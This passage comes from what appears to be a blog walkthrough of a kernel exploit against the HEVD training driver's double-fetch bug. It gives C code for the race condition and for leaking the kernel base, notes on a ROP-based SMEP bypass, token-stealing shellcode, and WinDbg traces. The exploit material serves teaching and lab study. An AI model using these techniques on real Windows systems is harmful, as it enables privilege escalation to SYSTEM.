<span class="normal"><a href="#__codelineno-20-15">15</a></span>
<span class="normal"><a href="#__codelineno-20-16">16</a></span>
<span class="normal"><a href="#__codelineno-20-17">17</a></span>
<span class="normal"><a href="#__codelineno-20-18">18</a></span>
<span class="normal"><a href="#__codelineno-20-19">19</a></span>
<span class="normal"><a href="#__codelineno-20-20">20</a></span>
<span class="normal"><a href="#__codelineno-20-21">21</a></span>
<span class="normal"><a href="#__codelineno-20-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="cm">/* Function to change the size member of the UserDoubleFetch struct */</span><span class="w"></span>
<a id="__codelineno-20-2" name="__codelineno-20-2"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">ChangeSizeThread</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">Size</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-20-3" name="__codelineno-20-3"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-20-4" name="__codelineno-20-4"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">ExploitSuccess</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-20-5" name="__codelineno-20-5"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-20-6" name="__codelineno-20-6"></a>
<a id="__codelineno-20-7" name="__codelineno-20-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Changing size on processor %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessorNumber</span><span class="p">());</span><span class="w"></span>
<a id="__codelineno-20-8" name="__codelineno-20-8"></a>
<a id="__codelineno-20-9" name="__codelineno-20-9"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ExploitSuccess</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-20-10" name="__codelineno-20-10"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-20-11" name="__codelineno-20-11"></a><span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">Size</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="mh">0x00000808</span><span class="p">;</span><span class="w"> </span><span class="c1">// 2056</span>
<a id="__codelineno-20-12" name="__codelineno-20-12"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-20-13" name="__codelineno-20-13"></a>
<a id="__codelineno-20-14" name="__codelineno-20-14"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-20-15" name="__codelineno-20-15"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-20-16" name="__codelineno-20-16"></a>
<a id="__codelineno-20-17" name="__codelineno-20-17"></a><span class="w">    </span><span class="cm">/* Initialize USER_DOUBLE_FETCH struct members */</span><span class="w"></span>
<a id="__codelineno-20-18" name="__codelineno-20-18"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">UserBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-20-19" name="__codelineno-20-19"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-20-20" name="__codelineno-20-20"></a>
<a id="__codelineno-20-21" name="__codelineno-20-21"></a><span class="w">    </span><span class="n">RtlFillMemory</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-20-22" name="__codelineno-20-22"></a><span class="w">    </span><span class="n">RtlFillMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">[</span><span class="mi">2056</span><span class="p">],</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x42</span><span class="p">);</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>If we run the updated POC above we gain exact control of the return address at 2056 bytes, as shown below.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
<span class="normal"><a href="#__codelineno-21-2">2</a></span>
<span class="normal"><a href="#__codelineno-21-3">3</a></span>
<span class="normal"><a href="#__codelineno-21-4">4</a></span>
<span class="normal"><a href="#__codelineno-21-5">5</a></span>
<span class="normal"><a href="#__codelineno-21-6">6</a></span>
<span class="normal"><a href="#__codelineno-21-7">7</a></span>
<span class="normal"><a href="#__codelineno-21-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1"></a>Access violation - code c0000005 (!!! second chance !!!)
<a id="__codelineno-21-2" name="__codelineno-21-2"></a>HEVD!TriggerDoubleFetch+0x136:
<a id="__codelineno-21-3" name="__codelineno-21-3"></a>fffff807`7b3a6952 c3              ret
<a id="__codelineno-21-4" name="__codelineno-21-4"></a>
<a id="__codelineno-21-5" name="__codelineno-21-5"></a>1: kd&gt; k
<a id="__codelineno-21-6" name="__codelineno-21-6"></a> # Child-SP          RetAddr               Call Site
<a id="__codelineno-21-7" name="__codelineno-21-7"></a>00 ffff9381`761277b8 42424242`42424242     HEVD!TriggerDoubleFetch+0x136 
<a id="__codelineno-21-8" name="__codelineno-21-8"></a>01 ffff9381`761277c0 00000000`00000000     0x42424242`42424242
</code></pre></div></td></tr></table></div>
<p>Now that we've got exact control of the return address we can begin building our final payload. However, if you read last post you'll know that we need to bypass <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr> in order to get execution. We can do this very easily using a simple <abbr title="Return Oriented Programming">ROP</abbr> chain.</p>
<h2 id="bypassing-smep">Bypassing <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr><a class="headerlink" href="#bypassing-smep" title="Permanent link">&para;</a></h2>
<p>I won't cover it again in full detail here but essentially all we need to do is get the kernel base address through <code>EnumDeviceDrivers</code> and then move the value <code>0x70678</code> into the CR4 register which will disable <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr>. If you'd like more detail on this please refer to my <a href="https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/">last post</a>. Below is the code needed to get the kernel base address and then update the CR4 register.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-22-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-22-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-22-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-22-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-22-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-22-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-22-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-22-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-22-10">10</a></span>
<span class="normal"><a href="#__codelineno-22-11">11</a></span>
<span class="normal"><a href="#__codelineno-22-12">12</a></span>
<span class="normal"><a href="#__codelineno-22-13">13</a></span>
<span class="normal"><a href="#__codelineno-22-14">14</a></span>
<span class="normal"><a href="#__codelineno-22-15">15</a></span>
<span class="normal"><a href="#__codelineno-22-16">16</a></span>
<span class="normal"><a href="#__codelineno-22-17">17</a></span>
<span class="normal"><a href="#__codelineno-22-18">18</a></span>
<span class="normal"><a href="#__codelineno-22-19">19</a></span>
<span class="normal"><a href="#__codelineno-22-20">20</a></span>
<span class="normal"><a href="#__codelineno-22-21">21</a></span>
<span class="normal"><a href="#__codelineno-22-22">22</a></span>
<span class="normal"><a href="#__codelineno-22-23">23</a></span>
<span class="normal"><a href="#__codelineno-22-24">24</a></span>
<span class="normal"><a href="#__codelineno-22-25">25</a></span>
<span class="normal"><a href="#__codelineno-22-26">26</a></span>
<span class="normal"><a href="#__codelineno-22-27">27</a></span>
<span class="normal"><a href="#__codelineno-22-28">28</a></span>
<span class="normal"><a href="#__codelineno-22-29">29</a></span>
<span class="normal"><a href="#__codelineno-22-30">30</a></span>
<span class="normal"><a href="#__codelineno-22-31">31</a></span>
<span class="normal"><a href="#__codelineno-22-32">32</a></span>
<span class="normal"><a href="#__codelineno-22-33">33</a></span>
<span class="normal"><a href="#__codelineno-22-34">34</a></span>
<span class="normal"><a href="#__codelineno-22-35">35</a></span>
<span class="normal"><a href="#__codelineno-22-36">36</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1"></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">GetKernelBase</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-2" name="__codelineno-22-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-3" name="__codelineno-22-3"></a>
<a id="__codelineno-22-4" name="__codelineno-22-4"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span><span class="w"></span>
<a id="__codelineno-22-5" name="__codelineno-22-5"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">lpcbNeeded</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-6" name="__codelineno-22-6"></a>
<a id="__codelineno-22-7" name="__codelineno-22-7"></a><span class="w">    </span><span class="cm">/* Get base address of first driver (ntoskrnl.exe) */</span><span class="w"></span>
<a id="__codelineno-22-8" name="__codelineno-22-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Obtaining Driver Base Address!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-9" name="__codelineno-22-9"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">DriversBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">lpcbNeeded</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-10" name="__codelineno-22-10"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DriversBase</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-11" name="__codelineno-22-11"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-12" name="__codelineno-22-12"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error enumerating device drivers!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-13" name="__codelineno-22-13"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-14" name="__codelineno-22-14"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-15" name="__codelineno-22-15"></a>
<a id="__codelineno-22-16" name="__codelineno-22-16"></a><span class="w">    </span><span class="cm">/* Get name of first driver (ntoskrnl.exe) */</span><span class="w"></span>
<a id="__codelineno-22-17" name="__codelineno-22-17"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">BaseName</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-22-18" name="__codelineno-22-18"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">DriversBaseName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetDeviceDriverBaseNameA</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">BaseName</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">BaseName</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-22-19" name="__codelineno-22-19"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DriversBaseName</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-20" name="__codelineno-22-20"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-21" name="__codelineno-22-21"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error getting drivers base name!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-22" name="__codelineno-22-22"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-23" name="__codelineno-22-23"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-24" name="__codelineno-22-24"></a>
<a id="__codelineno-22-25" name="__codelineno-22-25"></a><span class="w">    </span><span class="cm">/* </span>
<a id="__codelineno-22-26" name="__codelineno-22-26"></a><span class="cm">     * ntoskrnl.exe is the first module in lpImageBase.</span>
<a id="__codelineno-22-27" name="__codelineno-22-27"></a><span class="cm">     * typecast LPVOID -&gt; unsigned long long</span>
<a id="__codelineno-22-28" name="__codelineno-22-28"></a><span class="cm">    */</span><span class="w"></span>
<a id="__codelineno-22-29" name="__codelineno-22-29"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">KernelBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"></span>
<a id="__codelineno-22-30" name="__codelineno-22-30"></a>
<a id="__codelineno-22-31" name="__codelineno-22-31"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Driver base name is: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BaseName</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-32" name="__codelineno-22-32"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] %s is located at: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BaseName</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBase</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-33" name="__codelineno-22-33"></a>
<a id="__codelineno-22-34" name="__codelineno-22-34"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">KernelBase</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-35" name="__codelineno-22-35"></a>
<a id="__codelineno-22-36" name="__codelineno-22-36"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<h2 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h2>
<p>Shellcode specifically kernel continuation was definitely the most difficult part of this exploit. Although in theory it should be fairly similar to the continuation we used in the previous post, that was far from being the case. In-fact, this was way more difficult so let me walk you through it. I should note at this point that I actually did not get a working POC on Windows <abbr title="Redstone 1">RS1</abbr>, out of pure frustration I ended up writing POCs for <abbr title="Redstone 1">RS1</abbr>, RS2, RS4 and RS6 and RS4 was the release that I managed to get a SYSTEM shell on. That's not to say it isn't possible to get kernel continuation on those other releases, I just couldn't get it working. If anyone has any insight on this then I'd love to hear it. Let's start by looking at the shellcode which itself is fairly standard, just a typical token stealing payload for RS4.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-23-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-23-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-23-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-23-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-23-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-23-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-23-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-23-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-23-10">10</a></span>
<span class="normal"><a href="#__codelineno-23-11">11</a></span>
<span class="normal"><a href="#__codelineno-23-12">12</a></span>
<span class="normal"><a href="#__codelineno-23-13">13</a></span>
<span class="normal"><a href="#__codelineno-23-14">14</a></span>
<span class="normal"><a href="#__codelineno-23-15">15</a></span>
<span class="normal"><a href="#__codelineno-23-16">16</a></span>
<span class="normal"><a href="#__codelineno-23-17">17</a></span>
<span class="normal"><a href="#__codelineno-23-18">18</a></span>
<span class="normal"><a href="#__codelineno-23-19">19</a></span>
<span class="normal"><a href="#__codelineno-23-20">20</a></span>
<span class="normal"><a href="#__codelineno-23-21">21</a></span>
<span class="normal"><a href="#__codelineno-23-22">22</a></span>
<span class="normal"><a href="#__codelineno-23-23">23</a></span>
<span class="normal"><a href="#__codelineno-23-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1"></a>_START:
<a id="__codelineno-23-2" name="__codelineno-23-2"></a>    push   r8
<a id="__codelineno-23-3" name="__codelineno-23-3"></a>    push   r9
<a id="__codelineno-23-4" name="__codelineno-23-4"></a>    push   rax
<a id="__codelineno-23-5" name="__codelineno-23-5"></a>
<a id="__codelineno-23-6" name="__codelineno-23-6"></a>    mov    r8,QWORD PTR gs:0x188
<a id="__codelineno-23-7" name="__codelineno-23-7"></a>    mov    DWORD PTR [r8+0x1e4], 0x0
<a id="__codelineno-23-8" name="__codelineno-23-8"></a>    mov    r9,QWORD PTR [r8+0xb8]
<a id="__codelineno-23-9" name="__codelineno-23-9"></a>    mov    rax,r9
<a id="__codelineno-23-10" name="__codelineno-23-10"></a>
<a id="__codelineno-23-11" name="__codelineno-23-11"></a>_LOOP:   
<a id="__codelineno-23-12" name="__codelineno-23-12"></a>    mov    rcx,QWORD PTR [r9+0x2e0]
<a id="__codelineno-23-13" name="__codelineno-23-13"></a>    cmp    rcx,0x4
<a id="__codelineno-23-14" name="__codelineno-23-14"></a>    je     _LOOP
<a id="__codelineno-23-15" name="__codelineno-23-15"></a>    mov    r9,QWORD PTR [r9+0x2e8]
<a id="__codelineno-23-16" name="__codelineno-23-16"></a>    sub    r9,0x2e8
<a id="__codelineno-23-17" name="__codelineno-23-17"></a>    jmp    _LOOP
<a id="__codelineno-23-18" name="__codelineno-23-18"></a>    mov    rcx,QWORD PTR [r9+0x358]
<a id="__codelineno-23-19" name="__codelineno-23-19"></a>    and    cl,0xf0
<a id="__codelineno-23-20" name="__codelineno-23-20"></a>    mov    QWORD PTR [rax+0x358],rcx
<a id="__codelineno-23-21" name="__codelineno-23-21"></a>
<a id="__codelineno-23-22" name="__codelineno-23-22"></a>    pop    rcx
<a id="__codelineno-23-23" name="__codelineno-23-23"></a>    pop    r9
<a id="__codelineno-23-24" name="__codelineno-23-24"></a>    pop    r8
</code></pre></div></td></tr></table></div>
<p>As you can see the shellcode is not out of the ordinary and only varies slightly to the shellcode we used in the last post. The part that takes ages here is getting the kernel continuation after executing the shellcode. When we leave the <code>TriggerDoubleFetch</code> function in normal code execution we return into the <code>DoubleFetchIoctlHandler</code> function and then 0x28 is added to RSP. This behaviour is shown below.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-24-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-24-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-24-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-24-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-24-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-24-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-24-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-24-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-24-10">10</a></span>
<span class="normal"><a href="#__codelineno-24-11">11</a></span>
<span class="normal"><a href="#__codelineno-24-12">12</a></span>
<span class="normal"><a href="#__codelineno-24-13">13</a></span>
<span class="normal"><a href="#__codelineno-24-14">14</a></span>
<span class="normal"><a href="#__codelineno-24-15">15</a></span>
<span class="normal"><a href="#__codelineno-24-16">16</a></span>
<span class="normal"><a href="#__codelineno-24-17">17</a></span>
<span class="normal"><a href="#__codelineno-24-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1"></a>0: kd&gt; bp HEVD!TriggerDoubleFetch+136
<a id="__codelineno-24-2" name="__codelineno-24-2"></a>
<a id="__codelineno-24-3" name="__codelineno-24-3"></a>0: kd&gt; g
<a id="__codelineno-24-4" name="__codelineno-24-4"></a>Breakpoint 0 hit
<a id="__codelineno-24-5" name="__codelineno-24-5"></a>HEVD!TriggerDoubleFetch+0x136:
<a id="__codelineno-24-6" name="__codelineno-24-6"></a>fffff80e`c5aa6952 c3              ret
<a id="__codelineno-24-7" name="__codelineno-24-7"></a>
<a id="__codelineno-24-8" name="__codelineno-24-8"></a>0: kd&gt; p
<a id="__codelineno-24-9" name="__codelineno-24-9"></a>HEVD!DoubleFetchIoctlHandler+0x17:
<a id="__codelineno-24-10" name="__codelineno-24-10"></a>fffff80e`c5aa6817 4883c428        add     rsp,28h
<a id="__codelineno-24-11" name="__codelineno-24-11"></a>
<a id="__codelineno-24-12" name="__codelineno-24-12"></a>1: kd&gt; p
<a id="__codelineno-24-13" name="__codelineno-24-13"></a>HEVD!DoubleFetchIoctlHandler+0x1b:
<a id="__codelineno-24-14" name="__codelineno-24-14"></a>fffff80e`c5aa681b c3              ret
<a id="__codelineno-24-15" name="__codelineno-24-15"></a>
<a id="__codelineno-24-16" name="__codelineno-24-16"></a>1: kd&gt; p
<a id="__codelineno-24-17" name="__codelineno-24-17"></a>HEVD!IrpDeviceIoCtlHandler+0x26d:
<a id="__codelineno-24-18" name="__codelineno-24-18"></a>fffff80e`c5aa52e5 4c8d05e4320000  lea     r8,[HEVD! ?? ::NNGAKEGL::`string&#39; (fffff80e`c5aa85d0)]
</code></pre></div></td></tr></table></div>
<p>We can place a breakpoint before the <code>memcpy</code> and take a look at the call stack to see what possible return points there are.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-25-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-25-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-25-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-25-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-25-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-25-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-25-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-25-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-25-10">10</a></span>
<span class="normal"><a href="#__codelineno-25-11">11</a></span>
<span class="normal"><a href="#__codelineno-25-12">12</a></span>
<span class="normal"><a href="#__codelineno-25-13">13</a></span>
<span class="normal"><a href="#__codelineno-25-14">14</a></span>
<span class="normal"><a href="#__codelineno-25-15">15</a></span>
<span class="normal"><a href="#__codelineno-25-16">16</a></span>
<span class="normal"><a href="#__codelineno-25-17">17</a></span>
<span class="normal"><a href="#__codelineno-25-18">18</a></span>
<span class="normal"><a href="#__codelineno-25-19">19</a></span>
<span class="normal"><a href="#__codelineno-25-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1"></a>0: kd&gt; bp HEVD!TriggerDoubleFetch+F5
<a id="__codelineno-25-2" name="__codelineno-25-2"></a>
<a id="__codelineno-25-3" name="__codelineno-25-3"></a>0: kd&gt; g
<a id="__codelineno-25-4" name="__codelineno-25-4"></a>Breakpoint 1 hit
<a id="__codelineno-25-5" name="__codelineno-25-5"></a>HEVD!TriggerDoubleFetch+0xf5:
<a id="__codelineno-25-6" name="__codelineno-25-6"></a>fffff80e`c5aa6911 e8aaa8f7ff      call    HEVD!memcpy (fffff80e`c5a211c0)
<a id="__codelineno-25-7" name="__codelineno-25-7"></a>
<a id="__codelineno-25-8" name="__codelineno-25-8"></a>0: kd&gt; k
<a id="__codelineno-25-9" name="__codelineno-25-9"></a> # Child-SP          RetAddr               Call Site
<a id="__codelineno-25-10" name="__codelineno-25-10"></a>00 fffff909`4386ef70 fffff80e`c5aa6817     HEVD!TriggerDoubleFetch+0xf5 [c:\projects\hevd\driver\hevd\doublefetch.c @ 137] 
<a id="__codelineno-25-11" name="__codelineno-25-11"></a>01 fffff909`4386f7a0 fffff80e`c5aa52e5     HEVD!DoubleFetchIoctlHandler+0x17 [c:\projects\hevd\driver\hevd\doublefetch.c @ 176] 
<a id="__codelineno-25-12" name="__codelineno-25-12"></a>02 fffff909`4386f7d0 fffff802`dfb18799     HEVD!IrpDeviceIoCtlHandler+0x26d [c:\projects\hevd\driver\hevd\hacksysextremevulnerabledriver.c @ 342] 
<a id="__codelineno-25-13" name="__codelineno-25-13"></a>03 fffff909`4386f800 fffff802`dffb887b     nt!IofCallDriver+0x59
<a id="__codelineno-25-14" name="__codelineno-25-14"></a>04 fffff909`4386f840 fffff802`dffbcdea     nt!IopSynchronousServiceTail+0x1ab
<a id="__codelineno-25-15" name="__codelineno-25-15"></a>05 fffff909`4386f8f0 fffff802`dffba7d6     nt!IopXxxControlFile+0x68a
<a id="__codelineno-25-16" name="__codelineno-25-16"></a>06 fffff909`4386fa20 fffff802`dfbd6243     nt!NtDeviceIoControlFile+0x56
<a id="__codelineno-25-17" name="__codelineno-25-17"></a>07 fffff909`4386fa90 00007ffb`0cd6aa84     nt!KiSystemServiceCopyEnd+0x13
<a id="__codelineno-25-18" name="__codelineno-25-18"></a>08 00000053`fbdffc88 00007ffb`09722766     ntdll!NtDeviceIoControlFile+0x14
<a id="__codelineno-25-19" name="__codelineno-25-19"></a>09 00000053`fbdffc90 00007ff6`66a79124     0x00007ffb`09722766
<a id="__codelineno-25-20" name="__codelineno-25-20"></a>0a 00000053`fbdffc98 00000000`00000000     0x00007ff6`66a79124
</code></pre></div></td></tr></table></div>
<p>Before we attempt to return to any of these lets run our payload as-is and see what the register layout is like and also how our stack looks after executing our <abbr title="Return Oriented Programming">ROP</abbr> chain to disable <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr> and our shellcode. We can place a breakpoint on <code>nt!KiSetPageAttributesTable+0xc5</code> to get to our <code>pop rcx ; ret</code> gadget.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-26-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-26-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-26-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-26-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-26-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-26-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-26-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-26-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-26-10">10</a></span>
<span class="normal"><a href="#__codelineno-26-11">11</a></span>
<span class="normal"><a href="#__codelineno-26-12">12</a></span>
<span class="normal"><a href="#__codelineno-26-13">13</a></span>
<span class="normal"><a href="#__codelineno-26-14">14</a></span>
<span class="normal"><a href="#__codelineno-26-15">15</a></span>
<span class="normal"><a href="#__codelineno-26-16">16</a></span>
<span class="normal"><a href="#__codelineno-26-17">17</a></span>
<span class="normal"><a href="#__codelineno-26-18">18</a></span>
<span class="normal"><a href="#__codelineno-26-19">19</a></span>
<span class="normal"><a href="#__codelineno-26-20">20</a></span>
<span class="normal"><a href="#__codelineno-26-21">21</a></span>
<span class="normal"><a href="#__codelineno-26-22">22</a></span>
<span class="normal"><a href="#__codelineno-26-23">23</a></span>
<span class="normal"><a href="#__codelineno-26-24">24</a></span>
<span class="normal"><a href="#__codelineno-26-25">25</a></span>
<span class="normal"><a href="#__codelineno-26-26">26</a></span>
<span class="normal"><a href="#__codelineno-26-27">27</a></span>
<span class="normal"><a href="#__codelineno-26-28">28</a></span>
<span class="normal"><a href="#__codelineno-26-29">29</a></span>
<span class="normal"><a href="#__codelineno-26-30">30</a></span>
<span class="normal"><a href="#__codelineno-26-31">31</a></span>
<span class="normal"><a href="#__codelineno-26-32">32</a></span>
<span class="normal"><a href="#__codelineno-26-33">33</a></span>
